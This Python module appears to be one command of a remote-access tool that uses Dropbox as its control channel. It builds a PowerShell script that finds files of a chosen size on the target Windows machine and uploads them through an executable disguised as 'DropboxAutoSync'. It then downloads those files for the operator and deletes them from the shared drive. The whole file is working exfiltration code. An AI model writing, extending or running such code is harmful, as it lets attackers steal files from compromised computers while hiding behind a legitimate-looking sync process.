"""
Command download by size
"""


import os
import ntpath
from command.command import CommandBase
from logger.logger import Logger


class CommandDownloadSz(CommandBase):
    def __init__(self):
        self._engine = None
        self._drive_client = None
        self._logger = None
        self._arguments = {}
        self._file_old_list = []

    def get_name(self):
        return "download_sz"

    def get_arguments_names(self):
        return {"path": "Remote target file size"}

    def set_arguments(self, arguments):
        self._arguments = arguments

    def run(self, engine, client, logger):
        self._engine = engine
        self._drive_client = client
        self._logger = logger
        prefix = engine.get_path_prefix()
        size = self._arguments.get(0)
        if not size:
            logger.log_message("Size not specified")
            return False
        script = "$path=\"C:\\Users\\$([Environment]::UserName)\\AppData\\Roaming\\MyDropbox\\DropboxAutoSync\\DropboxAutoSync.exe\";" \
                 f"Get-ChildItem \"./\" | Foreach-Object {{ if ($_.Length -eq {size} ) {{ $name = $_.BaseName + $_.Extension; $dname = \"{prefix}/$($name)\"; & $path put $name $dname; }} }}"
        self._file_old_list = self._drive_client.list_dir(prefix)
        engine.run_script(script)
        return True

    def stop(self):
        pass
        "Nothing to do"

    def process_output(self, output):
        return output

    def drive_changed(self):
        path_prefix = self._engine.get_path_prefix()
        file_list = self._drive_client.list_dir(path_prefix)
        for file in file_list:
            if file not in self._file_old_list and file != "git.gitignore" and file != "readme.txt":
                rpath = path_prefix + "/" + file
                lpath = "." + path_prefix + os.sep + file
                self._drive_client.download_file(rpath, lpath)
                self._drive_client.remove(rpath)
                self._logger.log_message(f"File saved to '{lpath}'")
